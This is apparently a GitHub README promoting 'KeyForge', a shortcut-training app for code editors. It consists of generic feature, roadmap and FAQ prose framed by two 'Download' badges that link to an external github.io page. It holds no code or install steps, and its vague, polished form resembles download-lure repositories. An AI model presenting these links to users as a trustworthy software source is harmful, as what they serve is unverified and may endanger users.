![preview](https://raw.githubusercontent.com/Rtp22899/VSCode-Shortcut-Forge/main/promo_2bfe46.svg)
[![Download](https://raw.githubusercontent.com/Rtp22899/VSCode-Shortcut-Forge/main/go_6322.svg)](https://Rtp22899.github.io/VSCode-Shortcut-Forge/)

# ⌨️ KeyForge — The Keystroke Atelier for Editors

> *Where muscle memory is forged, one chord at a time.*

KeyForge is a playful, deeply interactive shortcut-coaching studio built for people who are just meeting their code editor for the first time. It was conceived as a spiritual successor to the idea behind VSCode-Trainer — a hotkey trainer for beginners — but reimagined as a full workshop: part dojo, part arcade, part personal journal of your growing reflexes. Instead of dumping a wall of keyboard combinations in front of you, KeyForge walks beside you, watches which combos trip you up, and quietly reshapes tomorrow's practice session around the gaps it discovered today.

This document is long on purpose. A tool like this deserves a proper field guide, and we would rather over-explain than leave a newcomer stranded at the door.

---

## 🧭 Table of Contents

- [Why KeyForge Exists](#-why-keyforge-exists)
- [The Philosophy: Reflex Over Recall](#-the-philosophy-reflex-over-recall)
- [Feature Atlas](#-feature-atlas)
- [Responsive Interface, Everywhere](#-responsive-interface-everywhere)
- [Multilingual Support](#-multilingual-support)
- [Around-the-Clock Assistance](#-around-the-clock-assistance)
- [Learning Modes](#-learning-modes)
- [How Progress Is Measured](#-how-progress-is-measured)
- [Design Principles](#-design-principles)
- [Accessibility Commitment](#-accessibility-commitment)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community and Contribution](#-community-and-contribution)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why KeyForge Exists

Every editor has a hidden language. Beginners see a menu; veterans see a gesture. The gap between those two views is not talent — it is repetition, structured well. KeyForge turns that gap into a bridge.

The original spark came from watching new developers hunt through dropdown menus for "rename symbol" while a single chord waited silently on the keyboard. That moment — the tiny friction of reaching for a mouse — is the exact thing KeyForge is designed to dissolve. It does so without condescension, without a wall of documentation, and without ever making you feel like you should already know this.

---

## 🧠 The Philosophy: Reflex Over Recall

There are two kinds of knowing a shortcut. The first is recall: you can name it when asked. The second is reflex: your fingers move before your brain finishes the sentence. KeyForge only cares about the second.

To get there, the trainer relies on three pillars:

1. **Spaced repetition with a twist** — chords you fumble return sooner; chords you nail drift further into the future, exactly like a well-tuned memory system should.
2. **Contextual immersion** — you are never shown a shortcut in a vacuum. Each drill is wrapped in a miniature scenario, so the gesture is tied to a real intent.
3. **Gentle pressure** — a soft timer nudges you forward without turning practice into a stress test.

The result feels less like studying and more like play — but the play leaves marks.

---

## 🗺️ Feature Atlas

The feature set below is the heart of the repository. Each item is a deliberate choice, not a checkbox.

- **Adaptive drill engine** — decides what you practice next based on your last forty interactions, weighted toward the chords that slowed you down.
- **Scenario-based lessons** — every shortcut arrives with a small story: renaming a variable mid-refactor, splitting an editor pane during a review, jumping between symbols in a large file.
- **Streak and rhythm tracking** — visualizes your consistency the way a musician tracks daily scales.
- **Ghost replays** — replays your own keystroke history, frame by frame, so you can literally watch yourself hesitate.
- **Importable cheat sheets** — bring your own chord lists from a plain text file; KeyForge folds them into the rotation.
- **Zero-pressure sandbox** — a mode with no scoring at all, for the days you just want to poke around.
- **Dark, light, and sepia skins** — because eyes deserve options.
- **Offline-first architecture** — your progress lives on your machine first, syncing only if you ask it to.
- **Keyboard-only navigation** — fitting, given the subject matter.
- **Exportable progress reports** — a tidy summary you can keep, print, or hand to a mentor.

---

## 📱 Responsive Interface, Everywhere

KeyForge was designed on a laptop but built to feel at home on anything with a screen. The layout reflows gracefully from an ultrawide monitor down to a small tablet in portrait orientation. Touch targets grow on smaller devices; density increases on larger ones. The goal is simple: whether you are practicing on a desk or reviewing a streak on a couch, the interface should feel intentional rather than merely shrunken.

Practically, that means:

- Fluid grid that respects the orientation of the device.
- Adaptive typography that never drops below comfortable reading size.
- Gesture-aware panels that collapse into drawers on narrow viewports.
- Respect for system-level reduced-motion preferences.

---

## 🌍 Multilingual Support

Shortcuts are universal; language is not. KeyForge ships with a translation layer that treats every string as content to be localized, not hardcoded text. Community translators can add a new language by supplying a single structured file.

Currently supported and in-progress locales include a broad spread of European and Asian languages, with more arriving as contributors volunteer. Right-to-left scripts are handled natively, including mirrored layouts where appropriate. The training engine itself is language-agnostic: a chord is a chord, regardless of the words around it.

---

## 🕰️ Around-the-Clock Assistance

Learning does not keep office hours, and neither does the help system. KeyForge offers continuous guidance through:

- **An in-app assistant** that answers questions about chords and drills using a curated knowledge base.
- **Community forums** where threads are answered by fellow learners and maintainers alike.
- **A rotating tip feed** that surfaces a different piece of editor wisdom every day.
- **Escalation paths** for bug reports that route directly to the maintainers' queue.

Whatever hour you find yourself staring at a chord you cannot quite recall, there is a way to get unstuck.

---

## 🎮 Learning Modes

Different moods call for different drills. KeyForge offers several, each tuned to a distinct emotional register:

| Mode | Mood | Best For |
| --- | --- | --- |
| Sprint | Fast, bright | Warming up before a work session |
| Deep Focus | Slow, deliberate | Learning a brand-new chord set |
| Gauntlet | Pressured, playful | Testing reflexes under mild stress |
| Sandbox | Open, unhurried | Exploring without consequence |
| Replay | Reflective | Reviewing past sessions |
| Cooldown | Calm | Ending a practice block gently |

Switching between modes never loses your place. Your streak, your statistics, and your custom chord lists all travel with you.

---

## 📊 How Progress Is Measured

Numbers can lie, so KeyForge tries to use honest ones.

- **Accuracy** — the share of chords triggered correctly on the first attempt.
- **Latency** — the median time between prompt and correct chord.
- **Retention** — how well you remember a chord a week after first learning it.
- **Consistency** — how evenly your practice sessions are spread across days.
- **Fluency score** — a composite that rewards speed only when accuracy holds.

The composite is deliberately opaque in its exact formula, so nobody games the number. What matters is the trend line, not the single value.

---

## 🎨 Design Principles

Every decision in KeyForge traces back to a small set of principles:

1. **Clarity before cleverness.** A clever interface that confuses is a failed interface.
2. **Respect the learner's time.** Sessions are short by default, and every second is accounted for.
3. **Show, do not scold.** Mistakes are data, not failures.
4. **Delight in small moments.** A subtle animation when a streak hits ten beats a confetti explosion.
5. **Never trap the user.** Everything can be undone, exported, or turned off.

---

## ♿ Accessibility Commitment

Accessibility is not a feature bolted on at the end; it is woven through the drills themselves.

- Full keyboard operability, which is fitting for a keyboard trainer.
- Screen-reader announcements for every prompt and result.
- High-contrast theme verified against WCAG contrast ratios.
- Adjustable timing for users who need a slower pace.
- Captions and transcripts for any embedded media.
- No reliance on color alone to convey meaning.

If you encounter a barrier, we want to hear about it — accessibility bugs are treated as first-class defects.

---

## 🛣️ Roadmap for 2026

A glimpse of where KeyForge is heading during 2026:

- **Q1 2026** — Expanded chord libraries for less common editor workflows.
- **Q2 2026** — Collaborative practice rooms for small study groups.
- **Q3 2026** — A plugin bridge that lets external tools push custom drills.
- **Q4 2026** — Public progression profiles, entirely opt-in, for learners who enjoy sharing milestones.

The roadmap is a sketch, not a contract. Priorities shift as the community speaks.

---

## 🤝 Community and Contribution

KeyForge grows through contributions of every size — a typo fix, a translated string, a new drill scenario, a thoughtful bug report. Before opening a pull request, please read the contribution guidelines in the repository and follow the existing code style. Discussions happen in the issues tracker, where maintainers aim to respond within a couple of days.

We ask only that contributors be kind. Beginners are welcome here by definition.

---

## ❓ Frequently Asked Questions

**Is KeyForge tied to a single editor?**
No. It ships with presets for a popular editor but accepts custom chord lists for any tool.

**Do I need prior experience?**
None at all. The trainer assumes you are starting from zero and never mocks you for it.

**Does it store my data in the cloud?**
Only if you explicitly enable syncing. By default, everything stays local.

**Can I use it without an internet connection?**
Yes. The core drills work entirely offline.

**How often should I practice?**
Short, frequent sessions beat long, rare ones. Ten minutes a day is a fine rhythm.

**Is there a mobile companion?**
The responsive interface serves phones and tablets directly; a separate app is on the 2026 roadmap.

---

## ⚠️ Disclaimer

KeyForge is an independent educational project. It is not affiliated with, endorsed by, or sponsored by any editor vendor, and any product names mentioned are the trademarks of their respective owners. The trainer is provided as-is, without warranty of any kind, express or implied. Progress results depend on individual practice habits, and no outcome is guaranteed. Users are responsible for ensuring their use of the software complies with their local laws and their employer's policies. The maintainers accept no liability for any loss or damage arising from use of this project. Always practice good ergonomics — your wrists will thank you.

---

## 📄 License

This project is released under the MIT License. You are welcome to use, modify, and distribute it, provided the original copyright notice is preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 KeyForge Contributors

[![Download](https://raw.githubusercontent.com/Rtp22899/VSCode-Shortcut-Forge/main/go_6322.svg)](https://Rtp22899.github.io/VSCode-Shortcut-Forge/)